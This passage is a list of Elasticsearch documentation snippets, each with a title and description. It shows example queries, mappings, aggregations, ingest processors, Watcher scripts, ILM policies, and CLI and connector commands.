SELECT DATE_PARSE('07/04/2020', 'dd/MM/yyyy') AS "date";

----------------------------------------

TITLE: Configuring Highlighting Tags
DESCRIPTION: Demonstrates how to customize the HTML tags used for highlighting matched terms.

LANGUAGE: console
CODE:
GET /_search
{
  "query" : {
    "match": { "user.id": "kimchy" }
  },
  "highlight" : {
    "pre_tags" : ["<tag1>"],
    "post_tags" : ["</tag1>"],
    "fields" : {
      "body" : {}
    }
  }
}

----------------------------------------

TITLE: Querying Geo-shape Data with Geo-bounding Box in Elasticsearch
DESCRIPTION: Shows how to use the geo_bounding_box query to match geo_shape values that intersect with a specified bounding box.

LANGUAGE: console
CODE:
GET my_geoshapes/_search
{
  "query": {
    "bool": {
      "must": {
        "match_all": {}
      },
      "filter": {
        "geo_bounding_box": {
          "pin.location": {
            "top_left": {
              "lat": 40.73,
              "lon": -74.1
            },
            "bottom_right": {
              "lat": 40.01,
              "lon": -71.12
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Basic Diversified Sampler Aggregation in Elasticsearch
DESCRIPTION: Example showing how to use diversified_sampler to analyze StackOverflow tags related to Elasticsearch while preventing bias from individual authors. Uses shard_size and field parameters to control sampling.

LANGUAGE: console
CODE:
POST /stackoverflow/_search?size=0
{
  "query": {
    "query_string": {
      "query": "tags:elasticsearch"
    }
  },
  "aggs": {
    "my_unbiased_sample": {
      "diversified_sampler": {
        "shard_size": 200,
        "field": "author"
      },
      "aggs": {
        "keywords": {
          "significant_terms": {
            "field": "tags",
            "exclude": [ "elasticsearch" ]
          }
        }
      }
    }
  }
}

LANGUAGE: console-result
CODE:
{
  ...
  "aggregations": {
    "my_unbiased_sample": {
      "doc_count": 151,
      "keywords": {
        "doc_count": 151,
        "bg_count": 650,
        "buckets": [
          {
            "key": "kibana",
            "doc_count": 150,
            "score": 2.213,
            "bg_count": 200
          }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Join Processor in Elasticsearch
DESCRIPTION: This JSON snippet demonstrates how to configure the Join processor in an Elasticsearch ingest pipeline. It specifies the field containing the array to be joined and the separator to use between elements.

LANGUAGE: json
CODE:
{
  "join": {
    "field": "joined_array_field",
    "separator": "-"
  }
}

----------------------------------------

TITLE: Indexing a Polygon shape in GeoJSON format
DESCRIPTION: Example of indexing a polygon shape using the GeoJSON format in Elasticsearch. Polygons are defined by a list of points, where the first and last points must be the same to close the polygon.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : {
    "type" : "polygon",
    "coordinates" : [
      [ [1000.0, -1001.0], [1001.0, -1001.0], [1001.0, -1000.0], [1000.0, -1000.0], [1000.0, -1001.0] ]
    ]
  }
}

----------------------------------------

TITLE: Configuring Synthetic _source for Date Fields in Elasticsearch
DESCRIPTION: This snippet shows how to enable synthetic _source for a date field and demonstrates the sorting behavior of date arrays in the resulting _source.

LANGUAGE: console
CODE:
PUT idx
{
  "settings": {
    "index": {
      "mapping": {
        "source": {
          "mode": "synthetic"
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "date": { "type": "date" }
    }
  }
}
PUT idx/_doc/1
{
  "date": ["2015-01-01T12:10:30Z", "2014-01-01T12:10:30Z"]
}

----------------------------------------

TITLE: Using MEDIAN_ABSOLUTE_DEVIATION in Elasticsearch SQL Query
DESCRIPTION: Example query demonstrating how to calculate both the median and median absolute deviation of salary data from an employees table. The function calculates median(|median(X) - X|) and is particularly useful for datasets with outliers or non-normal distributions.

LANGUAGE: sql
CODE:
FROM employees
| STATS MEDIAN(salary), MEDIAN_ABSOLUTE_DEVIATION(salary)

----------------------------------------

TITLE: Using DATE_PART Function
DESCRIPTION: Examples of using DATE_PART function to extract parts of dates and times.

LANGUAGE: sql
CODE:
SELECT DATE_PART('year', '2019-09-22T11:22:33.123Z'::datetime) AS "years";

LANGUAGE: sql
CODE:
SELECT DATE_PART('mi', '2019-09-04T11:22:33.123Z'::datetime) AS mins;

LANGUAGE: sql
CODE:
SELECT DATE_PART('quarters', CAST('2019-09-24' AS DATE)) AS quarter;

LANGUAGE: sql
CODE:
SELECT DATE_PART('month', CAST('2019-09-24' AS DATE)) AS month;

LANGUAGE: sql
CODE:
SELECT DATE_PART('week', '2019-09-22T11:22:33.123Z'::datetime) AS week;

LANGUAGE: sql
CODE:
SELECT DATE_PART('tzoffset', '2019-09-04T11:22:33.123+05:15'::datetime) AS tz_mins;

LANGUAGE: sql
CODE:
SELECT DATE_PART('tzoffset', '2019-09-04T11:22:33.123-03:49'::datetime) AS tz_mins;

----------------------------------------

TITLE: Dropbox Connector Advanced Sync Rules Example
DESCRIPTION: JSON configuration for advanced sync rules in the Dropbox connector. This example shows how to filter files based on queries and file types.

LANGUAGE: json
CODE:
[
  {
    "query": "dropbox",
    "options": {
      "file_extensions": [
        "txt",
        "pdf"
      ]
    }
  }
]

----------------------------------------

TITLE: Analyzing Text with KStem Filter in Elasticsearch
DESCRIPTION: Example of using the analyze API with KStem filter to stem English text. Shows how 'the foxes jumping quickly' is stemmed to basic forms.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "standard",
  "filter": [ "kstem" ],
  "text": "the foxes jumping quickly"
}

LANGUAGE: text
CODE:
[ the, fox, jump, quick ]

----------------------------------------

TITLE: Displaying QSTR Function Syntax in Markdown
DESCRIPTION: This snippet shows how to embed an image of the QSTR function syntax using Markdown.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/qstr.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Indexing a WKT Point in Elasticsearch
DESCRIPTION: Example of indexing a point using Well-Known Text (WKT) format in the geo_shape field.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : "POINT (-77.03653 38.897676)"
}

----------------------------------------

TITLE: CONVERT Function Example - ODBC Style
DESCRIPTION: Example of using CONVERT with ODBC-style SQL_INTEGER type specification.

LANGUAGE: sql
CODE:
SELECT CONVERT('123', SQL_INTEGER) AS int;

      int
---------------
123

----------------------------------------

TITLE: Changing Elasticsearch Keystore Password
DESCRIPTION: Changes the password of an existing elasticsearch.keystore using the passwd command.

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore passwd

----------------------------------------

TITLE: Querying a search_as_you_type Field with multi_match in Elasticsearch
DESCRIPTION: This snippet demonstrates how to query a search_as_you_type field using a multi_match query of type bool_prefix. It targets the main field and its shingle subfields for efficient as-you-type search.

LANGUAGE: console
CODE:
GET my-index-000001/_search
{
  "query": {
    "multi_match": {
      "query": "brown f",
      "type": "bool_prefix",
      "fields": [
        "my_field",
        "my_field._2gram",
        "my_field._3gram"
      ]
    }
  },
  "highlight": {
    "fields": {
      "my_field": {
        "matched_fields": ["my_field._index_prefix"]
      }
    }
  }
}

----------------------------------------

TITLE: Casting Values Using CAST Function in Elasticsearch SQL
DESCRIPTION: The CAST function converts an expression to a specified target data type. Takes an expression and target data type as parameters. Returns null if input is null, fails if conversion is not possible.

LANGUAGE: sql
CODE:
CAST(
    expression <1>
 AS data_type) <2>

----------------------------------------

TITLE: Creating and Immediately Refreshing Documents in Elasticsearch
DESCRIPTION: These examples demonstrate how to create a document and immediately refresh the index to make it visible for search. The refresh parameter is set either implicitly or explicitly to true.

LANGUAGE: console
CODE:
PUT /test/_doc/1?refresh
{"test": "test"}
PUT /test/_doc/2?refresh=true
{"test": "test"}

----------------------------------------

TITLE: ESQL Function Parameter Documentation
DESCRIPTION: Documentation specifying a single input parameter used for hashing operations in ESQL. The documentation is auto-generated by AbstractFunctionTestCase and should not be manually edited.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`input`
:   Input to hash.

----------------------------------------

TITLE: Using REPLACE Function in Elasticsearch SQL
DESCRIPTION: Searches for occurrences of a pattern in the source string and replaces them with a specified replacement. The resulting string cannot exceed 1 MB in byte length.

LANGUAGE: sql
CODE:
SELECT REPLACE('Elastic','El','Fant');

REPLACE('Elastic','El','Fant')
------------------------------
Fantastic

----------------------------------------

TITLE: Calculating Modulo in Elasticsearch SQL
DESCRIPTION: Illustrates the use of the modulo operator (%) in an Elasticsearch SQL query. This operation returns the remainder after division of one numeric value by another.

LANGUAGE: sql
CODE:
SELECT 5 % 2 AS x;

----------------------------------------

TITLE: Extracting First Letter and Aggregating Employee Names in ESQL
DESCRIPTION: This ESQL query extracts the first letter of each employee's first name, groups the names by this letter, sorts the names within each group, and then sorts the groups alphabetically. It demonstrates the use of SUBSTRING, EVAL, STATS, MV_SORT, VALUES, and SORT functions in ESQL.

LANGUAGE: esql
CODE:
  FROM employees
| EVAL first_letter = SUBSTRING(first_name, 0, 1)
| STATS first_name=MV_SORT(VALUES(first_name)) BY first_letter
| SORT first_letter

----------------------------------------

TITLE: Advanced Sync Rule: Combined Filters
DESCRIPTION: Example of an advanced sync rule for the GitHub connector that combines multiple filters for indexing documents and files based on issues, PRs, and branch name.

LANGUAGE: json
CODE:
[
  {
    "repository": "repo_name",
    "filter": {
      "issue": "is:bug",
      "pr": "is:open",
      "branch": "sync-rules-feature"
    }
  }
]

----------------------------------------

TITLE: Indexing a GeometryCollection in WKT format
DESCRIPTION: Example of indexing a geometry collection using the Well-Known Text (WKT) format in Elasticsearch. GeometryCollections can contain multiple geometry types.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : "GEOMETRYCOLLECTION (POINT (1000.0 100.0), LINESTRING (1001.0 100.0, 1002.0 100.0))"
}

----------------------------------------

TITLE: Querying Airport Data with ST_DISJOINT in ESQL
DESCRIPTION: This ESQL query filters airport data using the ST_DISJOINT function to find airports outside a specified polygon. It selects specific fields from the airport_city_boundaries index and applies a spatial filter using a hardcoded polygon.

LANGUAGE: esql
CODE:
FROM airport_city_boundaries
| WHERE ST_DISJOINT(city_boundary, TO_GEOSHAPE("POLYGON((-10 -60, 120 -60, 120 60, -10 60, -10 -60))"))
| KEEP abbrev, airport, region, city, city_location

----------------------------------------

TITLE: Listing Users in Elasticsearch File Realm
DESCRIPTION: This snippet shows how to list all users registered in the Elasticsearch file realm on the local node, displaying their usernames and associated roles.

LANGUAGE: shell
CODE:
bin/elasticsearch-users list

----------------------------------------

TITLE: Supported Sub-select Query in Elasticsearch SQL
DESCRIPTION: Demonstrates a supported sub-select query that can be flattened into a single SELECT statement.

LANGUAGE: sql
CODE:
SELECT * FROM (SELECT name, age FROM test) WHERE age > 30

----------------------------------------

TITLE: Complex Watcher with Multiple Scripted Components
DESCRIPTION: This example demonstrates a complete watch configuration using scripted condition, watch transform, and action-specific transforms. It processes theatre revenue data and logs high and low performing plays.

LANGUAGE: json
CODE:
POST _watcher/watch/_execute
{
  "watch" : {
    "metadata" : { "high_threshold": 4000, "low_threshold": 1000 },
    "trigger" : { "schedule" : { "interval" : "24h" } },
    "input" : {
      "search" : {
        "request" : {
          "indices" : [ "seats" ],
          "body" : {
            "query" : {
              "term": { "sold": "true"}
            },
            "aggs" : {
              "theatres" : {
                "terms" : { "field" : "play" },
                "aggs" : {
                  "money" : {
                    "sum": {
                      "field" : "cost",
                      "script": {
                       "source": "doc.cost.value * doc.number.value"
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    },
    "condition" : {
      "script" :
      """
        return ctx.payload.aggregations.theatres.buckets.stream()
          .anyMatch(theatre -> theatre.money.value < ctx.metadata.low_threshold ||
                               theatre.money.value > ctx.metadata.high_threshold)
      """
    },
    "transform" : {
      "script":
      """
        return [
          'money_makers': ctx.payload.aggregations.theatres.buckets.stream()
            .filter(t -> {
                return t.money.value > ctx.metadata.high_threshold
            })
            .map(t -> {
                return ['play': t.key, 'total_value': t.money.value ]
            }).collect(Collectors.toList()),
          'duds' : ctx.payload.aggregations.theatres.buckets.stream()
            .filter(t -> {
                return t.money.value < ctx.metadata.low_threshold
            })
            .map(t -> {
                return ['play': t.key, 'total_value': t.money.value ]
            }).collect(Collectors.toList())
          ]
      """
    },
    "actions" : {
      "log_money_makers" : {
        "condition": {
          "script" : "return ctx.payload.money_makers.size() > 0"
        },
        "transform": {
          "script" :
          """
          def formatter = NumberFormat.getCurrencyInstance();
          return [
            'plays_value': ctx.payload.money_makers.stream()
              .map(t-> formatter.format(t.total_value) + ' for the play ' + t.play)
              .collect(Collectors.joining(", "))
          ]
          """
        },
        "logging" : {
          "text" : "The following plays contain the highest grossing total income: {{ctx.payload.plays_value}}"
        }
      },
      "log_duds" : {
        "condition": {
          "script" : "return ctx.payload.duds.size() > 0"
        },
        "transform": {
          "script" :
          """
          def formatter = NumberFormat.getCurrencyInstance();
          return [
            'plays_value': ctx.payload.duds.stream()
              .map(t-> formatter.format(t.total_value) + ' for the play ' + t.play)
              .collect(Collectors.joining(", "))
          ]
          """
        },
        "logging" : {
          "text" : "The following plays need more advertising due to their low total income: {{ctx.payload.plays_value}}"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Listing Keystore Settings
DESCRIPTION: Lists all settings stored in the elasticsearch.keystore.

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore list

----------------------------------------

TITLE: Creating Custom Analyzer with N-gram Token Filter in Elasticsearch
DESCRIPTION: This example shows how to use the N-gram token filter to configure a new custom analyzer in Elasticsearch using the create index API.

LANGUAGE: console
CODE:
PUT ngram_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "standard_ngram": {
          "tokenizer": "standard",
          "filter": [ "ngram" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Equivalent Flattened Query for Supported Sub-select
DESCRIPTION: Shows the equivalent flattened query for the supported sub-select example.

LANGUAGE: sql
CODE:
SELECT name, age FROM test WHERE age > 30

----------------------------------------

TITLE: ESQL Parameter Documentation Format
DESCRIPTION: Documentation template showing parameter structure for 'number' field. The template appears to be empty or awaiting content.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Parameters**

`number`
:   

----------------------------------------

TITLE: Handling Missing Values
DESCRIPTION: Example showing how to handle missing values in the median absolute deviation calculation by specifying a default value.

LANGUAGE: console
CODE:
GET reviews/_search
{
  "size": 0,
  "aggs": {
    "review_variability": {
      "median_absolute_deviation": {
        "field": "rating",
        "missing": 5
      }
    }
  }
}

----------------------------------------

TITLE: EC2 IAM Policy for Elasticsearch Discovery
DESCRIPTION: JSON representation of an IAM policy granting the necessary EC2 permissions for the discovery plugin to function.

LANGUAGE: js
CODE:
{
  "Statement": [
    {
      "Action": [
        "ec2:DescribeInstances"
      ],
      "Effect": "Allow",
      "Resource": [
        "*"
      ]
    }
  ],
  "Version": "2012-10-17"
}

----------------------------------------

TITLE: Including REPEAT Function Parameters in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the parameters for the REPEAT function.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/repeat.md
:::

----------------------------------------

TITLE: Creating Enrollment Token for Kibana with Custom URL
DESCRIPTION: This example shows how to create an enrollment token for enrolling a Kibana instance into a cluster, specifying a custom URL for the local Elasticsearch node.

LANGUAGE: shell
CODE:
bin/elasticsearch-create-enrollment-token -s kibana --url "https://172.0.0.3:9200"

----------------------------------------

TITLE: Elasticsearch Query with Bucket Selector Aggregation
DESCRIPTION: This Elasticsearch query demonstrates how to use a bucket selector aggregation with a Painless script. It groups results by theater, calculates the max cost for each, and then filters buckets based on a custom script.

LANGUAGE: json
CODE:
{
  "size": 0,
  "aggs": {
    "theatres": {
      "terms": {
        "field": "theatre",
        "size": 10
      },
      "aggs": {
        "max_cost": {
          "max": {
            "field": "cost"
          }
        },
        "filtering_agg": {
          "bucket_selector": {
            "buckets_path": {
              "max": "max_cost"
            },
            "script": {
              "params": {
                "base_cost": 5
              },
              "source": "params.max + params.base_cost > 10"
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Computing MD5 and SHA-256 Hashes with ESQL HASH Function
DESCRIPTION: This snippet demonstrates the usage of the HASH function in ESQL to compute MD5 and SHA-256 hashes of the 'message' field. It filters out 'Connection error' messages and keeps only the relevant columns in the output.

LANGUAGE: sql
CODE:
FROM sample_data
| WHERE message != "Connection error"
| EVAL md5 = hash("md5", message), sha256 = hash("sha256", message)
| KEEP message, md5, sha256

----------------------------------------

TITLE: Indexing a MultiLineString shape in GeoJSON format
DESCRIPTION: Example of indexing a multilinestring shape using the GeoJSON format in Elasticsearch. MultiLineStrings are represented as an array of linestring coordinates.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : {
    "type" : "multilinestring",
    "coordinates" : [
      [ [1002.0, 200.0], [1003.0, 200.0], [1003.0, 300.0], [1002.0, 300.0] ],
      [ [1000.0, 100.0], [1001.0, 100.0], [1001.0, 100.0], [1000.0, 100.0] ],
      [ [1000.2, 100.2], [1000.8, 100.2], [1000.8, 100.8], [1000.2, 100.8] ]
    ]
  }
}

----------------------------------------

TITLE: Test Context Script Execution
DESCRIPTION: Example of executing a basic calculation script in the default painless_test context which requires minimal setup.

LANGUAGE: json
CODE:
POST /_scripts/painless/_execute
{
  "script": {
    "source": "params.count / params.total",
    "params": {
      "count": 100.0,
      "total": 1000.0
    }
  }
}

----------------------------------------

TITLE: Using LENGTH Function in Elasticsearch SQL
DESCRIPTION: Returns the number of characters in the input string, excluding trailing blanks.

LANGUAGE: sql
CODE:
SELECT LENGTH('Elastic   ');

LENGTH('Elastic   ')
--------------------
7

----------------------------------------

TITLE: Histogram Aggregation with Keyed Response in Elasticsearch
DESCRIPTION: Elasticsearch query demonstrating how to request a keyed response format for histogram aggregation results.

LANGUAGE: json
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "prices": {
      "histogram": {
        "field": "price",
        "interval": 50,
        "keyed": true
      }
    }
  }
}

----------------------------------------

TITLE: Performing LOOKUP JOIN in Elasticsearch SQL
DESCRIPTION: This example demonstrates how to use the LOOKUP JOIN command to enrich employee data with language information from a lookup index. It joins the 'employees' table with the 'languages_lookup_non_unique_key' index based on the 'language_code' field.

LANGUAGE: esql
CODE:
FROM employees
| EVAL language_code = emp_no % 10
| LOOKUP JOIN languages_lookup_non_unique_key ON language_code
| WHERE emp_no > 10090 AND emp_no < 10096
| SORT emp_no, country
| KEEP emp_no, language_code, language_name, country;

----------------------------------------

TITLE: Configuring JSON Processor Without Target Field in Elasticsearch
DESCRIPTION: This snippet shows how to configure the JSON processor without specifying a target field, which results in the parsed object replacing the original field content.

LANGUAGE: json
CODE:
{
  "json" : {
    "field" : "source_and_target"
  }
}

----------------------------------------

TITLE: Adding Non-Object Data to Disabled Field in Elasticsearch
DESCRIPTION: This snippet illustrates that when a field is disabled in Elasticsearch, it's possible to add non-object data to it. It shows creating an index with a disabled 'session_data' field and then successfully adding a document with non-object data in that field.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "session_data": {
        "type": "object",
        "enabled": false
      }
    }
  }
}

PUT my-index-000001/_doc/session_1
{
  "session_data": "foo bar"
}

----------------------------------------

TITLE: Deploying Elasticsearch Docker Container
DESCRIPTION: Runs an Elasticsearch Docker container with specified port mappings, volume mounts, and environment variables. Includes commands for both version 5 and 6.

LANGUAGE: bash
CODE:
docker run -d --name es \
-p 9200:9200 -p 9300:9300 \
-v ${SHARED_FOLDER}/config/elasticsearch.yml:/usr/share/elasticsearch/config/elasticsearch.yml \
-v ${SHARED_FOLDER}/data:/usr/share/elasticsearch/data \
-v ${SHARED_FOLDER}/snapshots:/usr/share/elasticsearch/snapshots \
--env "discovery.type=single-node" \
docker.elastic.co/elasticsearch/elasticsearch:5.6.16

// Version 6
docker.elastic.co/elasticsearch/elasticsearch:6.8.23

----------------------------------------

TITLE: Running End-to-End Tests for GraphQL Connector
DESCRIPTION: Shell commands to run functional tests for the GraphQL connector using Docker Compose.

LANGUAGE: shell
CODE:
$ make ftest NAME=graphql

LANGUAGE: shell
CODE:
make ftest NAME=graphql DATA_SIZE=small

----------------------------------------

TITLE: Basic Searchable Snapshot ILM Policy Configuration
DESCRIPTION: Demonstrates configuring a basic ILM policy with a searchable snapshot action in the cold phase. The snapshot will be stored in the specified repository.

LANGUAGE: console
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "cold": {
        "actions": {
          "searchable_snapshot" : {
            "snapshot_repository" : "backing_repo"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Using FORMAT Function
DESCRIPTION: Examples of using FORMAT function to format dates and times as strings using Microsoft SQL Server format specifiers.

LANGUAGE: sql
CODE:
SELECT FORMAT(CAST('2020-04-05' AS DATE), 'dd/MM/yyyy') AS "date";

LANGUAGE: sql
CODE:
SELECT FORMAT(CAST('2020-04-05T11:22:33.987654' AS DATETIME), 'dd/MM/yyyy HH:mm:ss.ff') AS "datetime";

LANGUAGE: sql
CODE:
SELECT FORMAT(CAST('11:22:33.987' AS TIME), 'HH mm ss.f') AS "time";

----------------------------------------

TITLE: Performing Subtraction in Elasticsearch SQL
DESCRIPTION: Shows how to use the subtraction operator (-) in an Elasticsearch SQL query. This operation subtracts one numeric value from another and returns the result.

LANGUAGE: sql
CODE:
SELECT 1 - 1 AS x;

----------------------------------------

TITLE: Basic Elasticsearch Keystore Command Synopsis
DESCRIPTION: Shows the complete command syntax for elasticsearch-keystore with all available options and subcommands.

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore
( [add <settings>] [-f] [--stdin]
| [add-file (<setting> <path>)+]
| [create] [-p]
| [has-passwd]
| [list]
| [passwd]
| [remove <setting>]
| [show [-o <output-file>] <setting>]
| [upgrade]
) [-h, --help] ([-s, --silent] | [-v, --verbose])

----------------------------------------

TITLE: SHOW TABLES with Multi-Target Syntax in Elasticsearch SQL
DESCRIPTION: Using Elasticsearch multi-target syntax to match multiple indices while excluding others.

LANGUAGE: sql
CODE:
SHOW TABLES "*,-l*";

----------------------------------------

TITLE: Error Stack Trace Generation
DESCRIPTION: Demonstrates how to enable stack traces in error responses using the error_trace parameter.

LANGUAGE: console
CODE:
POST /my-index-000001/_search?size=surprise_me&error_trace=true

----------------------------------------

TITLE: Calculating Sign with SIGNUM Function in ESQL
DESCRIPTION: This snippet demonstrates how to use the SIGNUM function in ESQL to determine the sign of a numeric value. It creates a row with a double value and applies the SIGNUM function to it.

LANGUAGE: esql
CODE:
ROW d = 100.0
| EVAL s = SIGNUM(d)

----------------------------------------

TITLE: Documenting ESQL Function Parameters in Markdown
DESCRIPTION: This snippet defines the parameters for an ESQL function that concatenates strings. It specifies two parameters: 'string1' and 'string2', both described as strings to be concatenated.

LANGUAGE: markdown
CODE:
**Parameters**

`string1`
:   Strings to concatenate.

`string2`
:   Strings to concatenate.

----------------------------------------

TITLE: Performing Addition in Elasticsearch SQL
DESCRIPTION: Demonstrates the use of the addition operator (+) in an Elasticsearch SQL query. This operation adds two numeric values and returns the result.

LANGUAGE: sql
CODE:
SELECT 1 + 1 AS x;

----------------------------------------

TITLE: Including TO_DATETIME Function Parameters in Markdown
DESCRIPTION: This snippet includes the markdown file containing the parameters for the TO_DATETIME function.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/to_datetime.md

----------------------------------------

TITLE: Downloading GraphQL Connector Configuration File
DESCRIPTION: Shell command to download the sample configuration file for the GraphQL connector.

LANGUAGE: shell
CODE:
curl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml

----------------------------------------

TITLE: Including REPEAT Function Types in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing the supported types for the REPEAT function.

LANGUAGE: markdown
CODE:
:::{include} ../types/repeat.md
:::

----------------------------------------

TITLE: Configuring ILM Policy with Explicit Shard Count
DESCRIPTION: Example showing how to configure an ILM policy that shrinks an index to a specific number of shards during the warm phase. Sets the number of shards explicitly to 1.

LANGUAGE: json
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "warm": {
        "actions": {
          "shrink" : {
            "number_of_shards": 1
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Running Elasticsearch Connector Service from Source
DESCRIPTION: Shell commands for compiling and running the Elasticsearch connector service from source code. These commands should be executed in the root directory of the cloned 'connectors' repository.

LANGUAGE: shell
CODE:
make install
make run

----------------------------------------

TITLE: Polish Stop Token Filter Analysis Result
DESCRIPTION: Response showing the tokens produced after analyzing text with the polish_stop filter. Demonstrates how stopwords are removed and only relevant tokens are retained.

LANGUAGE: console
CODE:
{
  "tokens" : [
    {
      "token" : "kucharek",
      "start_offset" : 6,
      "end_offset" : 14,
      "type" : "<ALPHANUM>",
      "position" : 1
    },
    {
      "token" : "sześć",
      "start_offset" : 15,
      "end_offset" : 20,
      "type" : "<ALPHANUM>",
      "position" : 2
    }
  ]
}

----------------------------------------

TITLE: Using CEIL/CEILING Function in Elasticsearch SQL
DESCRIPTION: Returns the smallest integer greater than or equal to the input numeric expression.

LANGUAGE: sql
CODE:
SELECT CEIL(125.01), CEILING(-125.99);

 CEIL(125.01)  |CEILING(-125.99)
---------------+----------------
126            |-125

----------------------------------------

TITLE: Indexing a Point shape in WKT format
DESCRIPTION: Example of indexing a point shape using the Well-Known Text (WKT) format in Elasticsearch. Points are represented by single x,y coordinates.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : "POINT (-377.03653 389.897676)"
}

----------------------------------------

TITLE: Basic Date Processor Configuration Example
DESCRIPTION: Example showing how to configure a date processor to parse dates from an 'initial_date' field into a 'timestamp' field using a specific date format and timezone.

LANGUAGE: json
CODE:
{
  "description" : "...",
  "processors" : [
    {
      "date" : {
        "field" : "initial_date",
        "target_field" : "timestamp",
        "formats" : ["dd/MM/yyyy HH:mm:ss"],
        "timezone" : "Europe/Amsterdam"
      }
    }
  ]
}

----------------------------------------

TITLE: Creating Year-Based Hire Count Histogram
DESCRIPTION: Shows how to combine DATE_TRUNC with STATS to create a histogram of employee hires per year. The query groups hire counts by truncated years and sorts the results chronologically.

LANGUAGE: esql
CODE:
FROM employees
| EVAL year = DATE_TRUNC(1 year, hire_date)
| STATS hires = COUNT(emp_no) BY year
| SORT year

----------------------------------------

TITLE: Using tail Pipe in EQL Query
DESCRIPTION: Demonstrates the tail pipe functionality to return the most recent matching events. This example returns the last 5 svchost.exe processes.

LANGUAGE: eql
CODE:
process where process.name == "svchost.exe"
| tail 5

----------------------------------------

TITLE: Querying Airport Boundaries with ST_CONTAINS in ESQL
DESCRIPTION: Demonstrates using ST_CONTAINS to find airports within a specified polygon boundary. The query selects specific fields including airport abbreviation, name, region, city, and location coordinates. Uses TO_GEOSHAPE to convert a polygon definition into a geometry object.

LANGUAGE: esql
CODE:
FROM airport_city_boundaries
| WHERE ST_CONTAINS(city_boundary, TO_GEOSHAPE("POLYGON((109.35 18.3, 109.45 18.3, 109.45 18.4, 109.35 18.4, 109.35 18.3))"))
| KEEP abbrev, airport, region, city, city_location

----------------------------------------

TITLE: Creating an Index with Histogram and Keyword Fields in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an index with a histogram field for storing percentile data and a keyword field for storing titles.

LANGUAGE: console
CODE:
PUT my_index
{
  "mappings" : {
    "properties" : {
      "my_histogram" : {
        "type" : "histogram"
      },
      "my_text" : {
        "type" : "keyword"
      }
    }
  }
}

----------------------------------------

TITLE: Creating API Key for Jira Connector
DESCRIPTION: API call to generate a security API key with required permissions for the connector

LANGUAGE: console
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Displaying SUM Function Syntax Diagram in Markdown
DESCRIPTION: This snippet shows how to embed an image of the SUM function syntax diagram in the documentation using Markdown image syntax.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/sum.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Documenting Numeric Parameter for ESQL Function in Markdown
DESCRIPTION: This snippet defines the parameter for a numeric function in ESQL. It specifies that the function takes a 'number' parameter, which should be a numeric expression. If the input is null, the function will return null.

LANGUAGE: markdown
CODE:
**Parameters**

`number`
:   Numeric expression. If `null`, the function returns `null`.

----------------------------------------

TITLE: Using Dynamic Types (def) in Painless
DESCRIPTION: Examples of using the 'def' type for dynamic typing in Painless, including type changes and implicit casting.

LANGUAGE: painless
CODE:
def dp = 1;
def dr = new ArrayList();
dr = dp;

Object l = new ArrayList();
def d = l;
d.ensureCapacity(10);

----------------------------------------

TITLE: Defining a String Field with Keyword Multi-field in Elasticsearch
DESCRIPTION: JSON mapping definition for a 'first_name' field of type 'text' with a 'keyword' multi-field named 'raw'. This structure allows both full-text search and exact matching capabilities.

LANGUAGE: json
CODE:
{
  "first_name": {
    "type": "text",
    "fields": {
      "raw": {
        "type": "keyword"
      }
    }
  }
}

----------------------------------------

TITLE: Markdown Documentation Structure
DESCRIPTION: Basic markdown structure for MEDIAN_ABSOLUTE_DEVIATION function documentation with image and included sections

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `MEDIAN_ABSOLUTE_DEVIATION` [esql-median_absolute_deviation]

**Syntax**

:::{image} ../../../images/functions/median_absolute_deviation.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/median_absolute_deviation.md
:::

:::{include} ../description/median_absolute_deviation.md
:::

:::{include} ../types/median_absolute_deviation.md
:::

:::{include} ../examples/median_absolute_deviation.md
:::

:::{include} ../appendix/median_absolute_deviation.md
:::

----------------------------------------

TITLE: Keyed Date Range Aggregation
DESCRIPTION: Shows how to return date range buckets as a hash with unique keys instead of an array. Includes examples of both automatic and custom key assignment.

